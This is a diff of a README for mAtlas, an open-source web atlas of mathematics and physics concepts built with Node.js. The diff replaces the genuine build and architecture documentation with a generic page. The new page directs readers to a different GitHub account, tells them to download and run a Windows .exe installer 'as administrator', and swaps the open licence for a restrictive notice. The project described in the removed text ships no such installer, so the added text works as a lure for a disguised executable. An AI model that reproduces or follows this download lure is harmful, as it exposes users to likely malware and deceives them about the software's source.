@@ -1,205 +1,57 @@
-# Atlas of Fundamental Concepts (mAtlas)
+# 🗺️ mAtlas - Visualize complex mathematical structures with ease
 
-[![Deploy GitHub Pages](https://github.com/madvay/mAtlas/actions/workflows/pages.yml/badge.svg)](https://github.com/madvay/mAtlas/actions/workflows/pages.yml)
+[![Download mAtlas](https://img.shields.io/badge/Download-mAtlas-blue)](https://github.com/ahead-hypothrombinemia693/mAtlas)
 
-An interactive, source-backed graph connecting concepts across fields of knowledge. The current release combines the existing mathematics atlas with an initial physics spine running from foundational physical concepts through classical mechanics, relativity, quantum mechanics, quantum field theory, the Standard Model, particles, nuclei, atoms, ions, and molecules.
+## 📖 About this project
+mAtlas serves as a visual guide through fundamental mathematical and scientific concepts. It organizes information into an atlas format. You can explore how number theory, set theory, and category theory connect to modern physics. This tool helps you see the underlying structure of the Standard Model and quantum mechanics. It transforms abstract proofs into readable visual maps.
 
-The atlas is one graph rather than a collection of isolated applications. Fields occupy vertically stacked, subtly bounded bands; domains form horizontal lanes within each field; and justified cross-field relations connect the bands.
+## ⚙️ System requirements
+Your computer needs the following specifications to run mAtlas smoothly:
+- Operating System: Windows 10 or Windows 11
+- Processor: 2 GHz dual-core processor or faster
+- Memory: 4 GB RAM
+- Storage: 500 MB of available disk space
+- Graphics: DirectX 11 compatible graphics card
 
-## Public routes
+## 📥 Download and installation
+1. Visit the following link to download the software: [https://github.com/ahead-hypothrombinemia693/mAtlas](https://github.com/ahead-hypothrombinemia693/mAtlas)
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Click the latest version link.
+4. Look for the file ending in .exe under the "Assets" section.
+5. Click this file to start your download.
+6. Once the download finishes, open your "Downloads" folder.
+7. Double-click the mAtlas installer file to begin the setup.
+8. Follow the prompts on your screen. The process creates a shortcut on your desktop automatically.
 
-- `/` — global atlas
-- `/math/` — mathematics scope
-- `/physics/` — physics scope
-- `/concepts/<id>/` — canonical concept pages
-- `/concepts/` — HTML/JavaScript compatibility redirect to `/directory/`
-- `/views/` — static directory of curated guided views
-- `/views/<id>/` — a static, crawlable guided-view route that opens the interactive atlas with the preset applied
-- `/content/atlas.<hash>.json` — immutable canonical graph export (the exact URL is linked from each generated page)
-- `/content/schema.<hash>.json` — published graph JSON Schema
-- `/content/views.<hash>.json` — immutable guided-view definitions
-- `/content/provenance.<hash>.json` — content/schema versions, source paths, SHA-256 hashes, license, and attribution
-- `/CONTENT_LICENSE` — content-specific CC BY-SA 4.0 notice
-- `/directory/` — static semantic atlas directory with the exact all-in SVG transcluded, crawlable concept links, relation definitions, structured data, and atlas context
-- `/static/atlas.svg` — stable standalone all-in SVG export containing every field, domain, concept, junction, and relation
+## 🚀 How to use the interface
+When you launch mAtlas, a navigation menu appears on the left side of your screen. This menu lists core subjects like set theory and quantum mechanics. 
 
-All runtime-readable JSON is published under `/content/`; the build does not emit a `/data/` directory.
+- Click any topic to load its visual map.
+- Use your mouse wheel to zoom in on specific proofs.
+- Drag your cursor to move around the map.
+- Click any node to open a detail card. These cards explain the concept using plain language. 
+- Use the search bar at the top to find specific terms like "Standard Model" or "ontology." 
 
-The generated site does not create or preserve `/m/`; configure an external redirect if one is required.
+## 🔍 Understanding the maps
+The maps use specific colors to represent different fields of study.
+- Blue nodes represent mathematical foundations.
+- Green nodes represent physics concepts.
+- Yellow nodes represent bridges between mathematics and physics.
 
-## Requirements and setup
+If you feel lost, click the "Reset View" button in the top right corner. This action centers the map and restores the default zoom level.
 
-- Node.js 20 or newer
-- npm
-- No system browser is required: the pinned Puppeteer development dependency installs the Chromium build used for the all-in SVG export.
+## 🔧 Troubleshooting
+If the application fails to open, check these points:
 
-```bash
-npm install
-npm run dev
-```
+- Ensure your Windows version remains up to date.
+- Restart your computer to clear temporary file conflicts.
+- Right-click the mAtlas icon and select "Run as administrator."
+- If the application crashes, verify that you have enough free space on your hard drive. 
 
-`npm run dev` rebuilds when files under `src/` or `content/` change and serves the result at `http://localhost:4173` by default.
+## ⚖️ License and usage
+mAtlas stays open for public use. You can explore the data and share the maps with friends or students. We focus on clarity and education. Please do not modify the core files or redistribute individual components without permission.
 
-## Build and checks
+## 🏗️ Future updates
+We plan to add more nodes covering advanced set theory and modern proof techniques. Check the repository periodically for new release versions. Each update builds upon the previous one to maintain a stable user experience.
 
-```bash
-npm run validate:content
-npm run content:build
-npm run test:content
-npm run typecheck
-npm test
-```
-
-`npm run content:build` validates editable source under `content/` and atomically writes the normalized renderer/publisher contract to `.build/content/`. The compiled contract contains `atlas.json`, `schema.json`, `views.json`, and `provenance.json`. Application code, page generators, and tests consume only this compiled boundary.
-
-`npm run build` first rebuilds that content contract, then writes the publishable static site to `dist/`, including the stable `/static/atlas.svg` all-in export and `/directory/` semantic atlas directory. The build opens the compiled application in headless Chrome/Chromium with every filter enabled and invokes the same `SvgExporter.serializeVisible()` implementation used by the runtime download button; there is no separate SVG renderer. The generated HTML page removes only the standalone XML declaration and transcludes the resulting SVG element byte-for-byte, while adding ordinary HTML concept links, field/domain context, a relation legend, `WebPage`/`ImageObject` structured data, and links to the interactive and machine-readable forms. `npm run build:pages` copies that output unchanged to `.pages/` for GitHub Pages.
-
-Validation is split into schema/shape, reference, semantic, editorial, and renderer-compatibility layers. The complete validator checks contract versions, field/domain membership, node and edge references, citations and source URLs, construction-junction consistency, structural direction and cycles, duplicate relations, source usage, generic detail sections, explicit inline-math markup, and every guided view's identifiers and settings.
-
-## Additional scripts
-
-- `npm run clean` removes generated build artifacts such as `.build/`, `dist/`, and `.pages/`.
-- `npm run validate:content:<layer>` runs one validation layer (`schema`, `references`, `semantic`, `editorial`, or `renderer`).
-- `npm run test:content` compiles the content contract and verifies normalized output, versions, hashes, and license provenance.
-- `npm run preview` serves the contents of `dist/` locally for review after building.
-- `npm run math:mark` helps migrate legacy unmarked math to explicit `$...$` delimiters; its changes require editorial review.
-
-## Architecture
-
-```text
-content/
-  concepts/                 split editable graph dataset (YAML)
-  views/                    split guided-view definitions (YAML)
-  schema.json                published graph schema
-  manifest.json              content and schema contract versions
-  LICENSE                    content-specific CC BY-SA notice
-src/
-  index.html                 shared application shell
-  styles.css                 application, graph, and field-band styling
-  main.ts                    graph renderer, routing, state, details, and SVG export
-  types.ts                   graph and application types
-scripts/
-  build-content.mjs          validates and compiles content into .build/content/
-  validate-content.mjs       layered content validation entry point
-  content/                   contract, loader, and validation modules
-  build.mjs                  bundles software, publishes compiled content, and assembles dist/
-  generate-concept-pages.mjs canonical concept pages, the /concepts/ redirect, and field-scope pages
-  generate-view-pages.mjs    view directory and crawlable view routes
-  generate-static-atlas-svg.mjs
-                              invokes the compiled runtime SVG exporter for /static/atlas.svg
-  generate-directory-page.mjs
-                              transcludes that exact SVG into the semantic /directory/ page
-  generate-seo-assets.mjs    sitemap, robots.txt, and llms.txt
-  prepare-pages.mjs          root-level GitHub Pages artifact
-.build/content/              generated, normalized build contract; never edited directly
-```
-
-`content/concepts/index.yaml` (plus split parts under `content/concepts/`) is the canonical graph dataset. `content/views/index.yaml` (plus per-view files under `content/views/`) is a separate editorial/navigation layer: it references graph identifiers but does not duplicate or alter graph content. `content/manifest.json` declares `schemaVersion` and `contentVersion`; `scripts/content/contract.mjs` declares the schema versions supported by the software. The renderer and publishers read only `.build/content/`, so a later extraction of `content/` into a separately versioned repository does not require an application rewrite.
-
-### Taxonomy
-
-Each domain belongs to one field. Each concept declares:
-
-- `primaryField` and `fields`
-- `primaryDomain` and `domains`
-- `conceptType`
-- `level`, used for vertical placement within the field band
-- common descriptive fields and optional generic `sections`
-
-Existing mathematics concepts inherit the mathematics field through their domains. Physics concepts use the generalized detail-section model so theories, laws, fields, particles, systems, processes, states, and phenomena can coexist without forcing them into the mathematics-specific carrier/data/axiom schema.
-
-A concept may eventually belong to several fields. Boundary concepts such as atoms and molecules should remain single nodes with multiple memberships once chemistry is added, unless distinct disciplinary concepts genuinely require separate nodes.
-
-### Relations
-
-Each edge type declares how it participates in prerequisite closure. `incoming` means the source is added when the target is already in the closure, `outgoing` means the target is added when the source is already in the closure, and `both` permits either traversal. This metadata is the single definition used by filtering and breadth-first layout root selection.
-
-The original mathematical relation types remain. The multi-field model adds relation types for:
-
-- mathematical formulation
-- framework specialization
-- quantization
-- theory components
-- description or governance
-- composition
-- classification
-- field excitation
-- interaction mediation
-- binding or formation
-- limiting approximations
-- state descriptions
-- transformations and processes
-
-Relations are not treated as one undifferentiated “built from” ordering. This is essential in physics: special relativity and quantum mechanics jointly constrain relativistic QFT, general relativity is parallel to the Standard Model rather than downstream from it, and classical limits are marked as approximations rather than derivations.
-
-## User interface and URL state
-
-The left panel contains collapsible field/domain, edge, display, preferences, and data sections. The Display section contains the layout selector and a **Cross-field links** option:
-
-- `contextual` — show designated overview bridges and reveal local bridges for the selected neighborhood
-- `all` — show all admitted cross-field relations
-- `hidden` — suppress cross-field relations and their external prerequisite context
-
-Fields, domains, edge types, cross-field visibility, display options, and layout are encoded in query parameters for bookmarkable views and browser history. Performance and rendering preferences (resolution, transitions, motion blur, graph formulae, and secondary-domain indicators) are instead restored from local storage and can be reset from the Preferences section; they are never added to URLs.
-The defaults enable native-resolution rendering, transitions, and secondary-domain indicators while disabling motion blur and KaTeX graph overlays; lightweight Unicode math remains visible in graph labels and exported SVGs.
-
-Fields and domains can also be marked **excluded** without clearing the ordinary inclusion filters. Exclusions suppress concepts whose primary field/domain is excluded, including prerequisite-only context, while still allowing a multi-domain concept through when it has an explicitly included, non-excluded secondary domain. Excluded fields/domains and the Display section's **Hide prerequisites** option are view state and are therefore encoded in URLs (`excludeFields`, `excludeDomains`, and `hidePrereqs`) and supported by guided-view settings. Local preferences additionally control graph edge-label rendering, whether edges disappear during viewport gestures, and whether prerequisite context is dimmed; these preferences also apply to SVG exports where relevant.
-
-The scoped routes initialize their corresponding field while using the same graph and codebase. Canonical concept URLs are field-independent so a multi-field concept has one durable identity.
-
-
-### Guided views
-
-A view is a named preset in `content/views/index.yaml`, with one YAML file per view under `content/views/`. It contains editorial copy (`title`, `summary`, `narrative`, and `tags`), an optional image, an ordered `nodeSequence`, and a complete settings object for fields, domains, edge types, cross-field visibility, display controls, and layout.
-
-The first sequence node is the view’s initial selection. Previous and Next controls advance through the ordered concepts on desktop and mobile; selecting anything else leaves the sequence position unchanged. The build emits a static directory page and one crawlable application page per view. View routes are included in `sitemap.xml` and represented as `CollectionPage` JSON-LD. In the application, the **Views** toolbar control opens the same data-driven catalog, while a dismissible first-visit prompt makes the feature discoverable without permanently occupying graph space.
-
-A `/views/<id>/` URL remains active while the effective settings exactly match its preset. Selecting concepts, highlighting neighborhoods, searching, and opening details do not leave the route. Changing any filter, display setting, or layout exits the named view and writes the resulting configuration through the ordinary atlas/concept URL scheme. Returning through browser history restores the preset.
-
-All concepts admitted by the selected taxonomy are shown, including concepts with no currently visible edges. There is no isolated-node suppression state or URL parameter.
-
-## Inline mathematics
-
-Math-capable strings use explicit `$...$` LaTeX delimiters in source content:
-
-```json
-"body": "Its gauge group is $SU(3)_C \\times SU(2)_L \\times U(1)_Y$."
-```
-
-The browser escapes prose and sends only delimited formulas to KaTeX. `npm run math:mark` remains a migration aid for older unmarked text; its changes require editorial review.
-
-## GitHub Pages
-
-`.github/workflows/pages.yml` installs locked dependencies with `npm ci`, runs the complete `npm test` pipeline, prepares `.pages/`, and deploys it. The artifact now places the complete atlas at its root, including `/math/`, `/physics/`, `/directory/`, `/concepts/`, `/views/`, and `/static/atlas.svg`.
-
-## License
-
-See [NOTICE](NOTICE), [LICENSE](LICENSE), and the content-specific [content/LICENSE](content/LICENSE) for licensing information. The build publishes the latter as `/CONTENT_LICENSE` and records the content license and attribution in the hashed provenance artifact.
-
-```
-mAtlas - Copyright (c) 2026 Advay Mengle - https://atlas.madvay.com/
-
-The editable knowledge and editorial source files in `content/`, together
-with compiled or published content derived from them (including graph, schema,
-guided-view, page, directory, search-index, and SVG content), are licensed
-under the Creative Commons Attribution-ShareAlike 4.0 International License
-(CC BY-SA 4.0, https://creativecommons.org/licenses/by-sa/4.0/). Attribution
-should be given per the first line in this file. See also `content/LICENSE`.
-
-The remainder of mAtlas is licensed under the Apache License 2.0:
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-
-See also THIRD_PARTY_NOTICES.txt for third-party notices and licenses
-for certain software that may be included in or distributed with mAtlas.
-```
+Keywords: atlas, category-theory, mathematics, number-theory, ontology, physics, proofs, quantum-mechanics, set-theory, standard-model, theory
